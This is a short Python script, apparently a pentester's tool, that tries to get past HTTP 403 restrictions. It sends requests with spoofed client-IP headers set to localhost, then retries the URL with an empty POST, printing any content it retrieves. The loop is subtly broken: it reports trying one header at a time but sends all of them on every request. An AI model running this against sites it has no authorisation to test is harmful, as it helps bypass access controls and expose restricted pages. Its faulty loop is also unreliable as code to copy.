# Made by Suphawith Phusanbai - A lazy pentester
### Working in progress ###

import requests

def bypass_using_headers(url):
    # if you know more you can add them here.
    headers = {
        "X-ProxyUser-Ip": "127.0.0.1",
        "Client-IP": "127.0.0.1",
        "X-Originating-IP":"127.0.0.1",
        "X-Forwarded-For":"127.0.0.1",
        "X-Remote-IP":"127.0.0.1",
        "X-Remote-Addr":"127.0.0.1",
        "X-Real-IP":"127.0.0.1",
        "Referer":"https://127.0.0.1",
        "X-Forwarded-Host": "127.0.0.1",
        "X-Custom-IP-Authorization":"127.0.0.1",
    }
    for everyheaders in headers:
        response = requests.get(url, headers=headers)
        print(f"[+] Trying {everyheaders} technique")
        print("[+] HTTP STATUS CODE:", response.status_code)
        if response.status_code == 200:
            print("[+] HTTP Response:", response.text)
        elif response.status_code == 301:
            print("[+] HTTP Response:", response.text)
        elif response.status_code == 403:
            print("[!] Connection failed! HTTP Response:", response.text)
        else:
            print("Unknown problem", response.status_code)
         
def bypass_using_POST_method(url):
    print("[+] Using different HTTP methods.")
    # try POST method
    post_header = {
        "Content-Length":"0"
    }
    post_method = requests.post(url, headers=post_header)
    if post_method.status_code == 200:
        print("[+] It works!", post_method.status_code)
        print("[+] HTTP Response:", post_method.text)
    else:
        print("[-] HTTP Response is not 200 but", post_method.status_code)
    


url = input("Enter the restricted 403 page URL:")
bypass_using_headers(url)
bypass_using_POST_method(url)